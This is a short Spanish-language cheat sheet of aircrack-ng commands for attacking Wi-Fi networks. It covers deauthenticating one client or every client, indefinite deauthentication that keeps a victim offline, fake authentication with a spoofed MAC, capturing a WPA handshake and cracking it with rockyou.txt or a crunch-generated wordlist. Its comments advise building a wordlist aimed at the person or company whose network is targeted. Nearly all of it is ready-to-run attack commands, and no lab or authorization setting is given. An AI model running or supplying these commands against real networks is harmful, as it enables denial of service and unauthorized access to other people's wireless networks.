# Tecnica de Deautenticacion
```bash
aireplay-ng -0 10 -e [Nombredered] -c [Canal] [StationDelCliente] wlan0
```

# Tecnica de Deautenticacion global
```bash
aireplay-ng -0 10 -e [Nombredered] -c [Canal] FF:FF:FF:FF:FF:FF wlan0
```

# Es lo mismo pero mas facil de recordar
```bash
aireplay-ng -0 10 -e [Nombredered] wlan0
```

# Sacas al cliente y no puede conectarse hasta que canceles con CTRL
```bash
aireplay-ng -0 0 -e Nombredered] [StationDelCliente] wlan0
```

# Tecnica de falsa Autenticacion 
```bash
aireplay-ng -1 0 -e [Nombredered] -a [Bssiddelpuntodeacceso] -h [DireccionMacFalsa] wlan0
```

# Escaneo con guardado para captura de handshake de un punto de acceso wifi
```bash
airodump-ng --bssid mac --channel canal -w test_wifi antena
```

# Hariamos una deautenticacion y el escaneo capturaria el handshake cuando los dispositivos intenten reconectarse :
```bash
aireplay-ng -0 10 -e [Nombredered] -c [Canal] [StationDelCliente] wlan0
```

# Se nos crean los archivos en la carpeta que estabamos ubicados, el que tiene el HShake es el de formato .cap
```bash
aircrack-ng -b [BSSID] -w /usr/share/wordlists/rockyou.txt [NOMBREDEARCHIVO].cap
```

# Rockyou es un diccionario en Ingles el cual se usa para passwords asi que esto no sirve solo es una prueba ahora toca hacerte tu diccionario especifico para tu objetivo o conseguir uno en internet el cual sea para el router o region que tu necesitas atacar.

# Muchas veces las passwords del wifi son por defecto pero muchas otras si o si necesitas un diccionario con la informacion de la empresa o persona a la que pertenece esa red

# Si sospechas que la contrasena son numeros puedes hacer lo mismo  concatenando con crunch un script sencillo que sirve para crear wordlists

```bash
sudo crunch  08 30 12345  | aircrack-ng -b [BSSID] [NOMBREDEARCHIVO].cap -w-
```

